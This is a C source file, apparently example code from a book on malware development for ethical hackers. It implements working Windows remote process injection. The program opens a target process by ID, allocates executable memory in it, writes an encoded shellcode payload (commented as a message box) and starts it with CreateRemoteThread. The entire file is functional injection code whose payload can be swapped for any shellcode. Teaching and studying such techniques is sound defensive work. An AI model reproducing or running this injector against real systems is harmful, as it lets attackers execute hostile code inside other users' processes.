/*
Malware Development for Ethical Hackers
example2.c
Code injection example
created by: @cocomelonc
copyright: PacktPub
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// payload: messagebox
unsigned char payload[] =
"\x48\x31\xc9\x48\x81\xe9\xdc\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xa1\x3d\x5e\xa2\x35\xaf\x66\x81\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5d\x75\xdf\x46\xc5\x50"
"\x99\x7e\x49\xed\x5e\xa2\x35\xee\x37\xc0\xf1\x6f\x0f\xf4\x7d"
"\x9e\xb4\xe4\xe9\xb6\x0c\xc2\x0b\xe7\xed\xd3\xb9\x03\x16\x29"
"\x67\x8f\x58\xc9\x2a\x4f\x0e\x9c\x7d\xa0\xd1\xcb\xeb\x70\x6f"
"\x6b\x7d\x9e\xa6\x2d\x9d\x5c\x22\xa0\x19\x8f\x27\x40\x68\x30"
"\x1f\xa3\xf4\x4d\x8b\xd3\xe0\x6c\x60\xea\xbe\xfd\x46\xbf\x2a"
"\x7f\x62\xea\x34\x7f\x58\x0a\x21\xb5\x5e\xa2\x35\xe7\xe3\x41"
"\xd5\x52\x16\xa3\xe5\xff\x58\x0a\xe9\x25\x60\xe6\xbe\xef\x46"
"\xc8\xa0\xed\xbd\xfe\x7d\x50\xaf\xbf\xe0\xb6\x6a\x2a\x7d\xae"
"\xb0\xcc\x90\xf4\x16\x93\xf5\x03\x27\x40\x68\x30\x1f\xa3\xf4"
"\x97\x86\xf4\x50\x03\x12\xa1\x79\x8b\x6e\xc4\x98\xec\x2b\x74"
"\x6d\x91\x22\x0a\xe1\x19\x17\xa3\xe5\xc9\x58\xc0\x2a\x31\x16"
"\x9c\x71\x24\x26\x9d\xe8\x3c\x8e\x9c\x74\x24\x62\x09\xe9\x3c"
"\x8e\xe3\x6d\xee\x3e\xdf\xf8\x67\x1f\xfa\x74\xf6\x27\xdb\xe9"
"\xbe\xb2\x82\x74\xfd\x99\x61\xf9\x7c\x07\xf8\x0b\xe7\xed\x93"
"\x48\x74\xa1\x5d\xca\xf2\x2f\x46\x60\x3d\x5e\xa2\x35\x91\x2e"
"\x0c\x34\xc3\x5e\xa2\x35\x91\x2a\x0c\x24\x37\x5f\xa2\x35\xe7"
"\x57\x48\xe0\x87\x1b\x21\x63\xa8\x99\x54\xe9\x0c\x97\xe3\x8f"
"\x5f\xd3\x23\xf7\xc2\x8b\xea\x50\xc3\x0a\xee\x81\x4a\x31\xd0"
"\x59\xcb\x66\xd1\xc0\x5e\x35\xd6\x35\xaf\x66\x81";

unsigned int payload_length = sizeof(payload);

int main(int argc, char* argv[]) {
  HANDLE process_handle; // Handle for the target process
  HANDLE remote_thread; // Handle for the remote thread
  PVOID remote_buffer; // Buffer in the remote process

  // Parse the target process ID
  printf("Target Process ID: %i", atoi(argv[1]));
  process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

  // Allocate memory in the target process for remote buffer
  remote_buffer = VirtualAllocEx(process_handle, NULL, payload_length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // Copy payload data from our process to the remote process
  WriteProcessMemory(process_handle, remote_buffer, payload, payload_length, NULL);

  // Create a remote thread in the target process to start our payload
  remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
  
  // Clean up and close the process handle
  CloseHandle(process_handle);

  return 0;
}
